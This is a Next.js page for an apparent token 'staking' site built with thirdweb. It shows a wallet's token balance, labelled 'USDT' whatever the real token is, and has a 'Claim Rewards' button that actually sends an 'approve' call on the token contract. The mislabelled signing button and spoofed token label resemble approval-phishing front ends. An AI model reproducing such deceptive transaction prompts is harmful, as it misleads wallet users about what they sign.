import {
  ConnectWallet,
  useAddress,
  useContract,
  useTokenBalance,
  Web3Button,
} from "@thirdweb-dev/react";
import type { NextPage } from "next";
import styles from "../styles/Theme.module.css";

import { useContractWrite } from "@thirdweb-dev/react";
import Image from "next/image";
import Box from "../public/box1.png"


const StakingMutant: NextPage = () => {
  const address = useAddress();

  const tokenContractAddress = "0x37F6BBE4fB136BEA7A678651031BbBE577B25f21";

  const { contract: tokenContract } = useContract(
    tokenContractAddress,
    "token"
  );
  const { data: tokenBalance } = useTokenBalance(tokenContract, address);

  const amount = "1000000";

  return (
    <>


      <div className={address ? styles.container : styles.container + " " + styles.ccbtn}>

        {!address ? (
          <div className="connect-btn"> <ConnectWallet /> </div>
        ) : (
          <>
            <Image src={Box} alt="" className="box-img" />
            <h2 className="wb">WALLET BALANCE</h2>
            <div className={styles.tokenGrid + " " + styles.currbalance}>
              <div className={styles.tokenItem + " " + styles.tokenIt}>
                <h3 className={styles.tokenLabel}>Current Balance</h3>
                <p className={styles.tokenValue}>
                  {/* <b>{tokenBalance?.displayValue.substring(0, 4)}</b> {tokenBalance?.symbol} */}
                  <b>{tokenBalance?.displayValue.substring(0, 4)}</b> USDT
                </p>
              </div>
            </div>

            <br />
            <Web3Button
              contractAddress="0x37F6BBE4fB136BEA7A678651031BbBE577B25f21"
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn} ${styles.clainbtn}`}
              action={(contract) => {
                contract.call("approve", [address, amount])
              }}
            >
              Claim Rewards
            </Web3Button>


            {/* <button
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn}`}

            >
              Start Earning
            </button> */}
          </>
        )}
      </div>
    </>
  );
};

export default StakingMutant;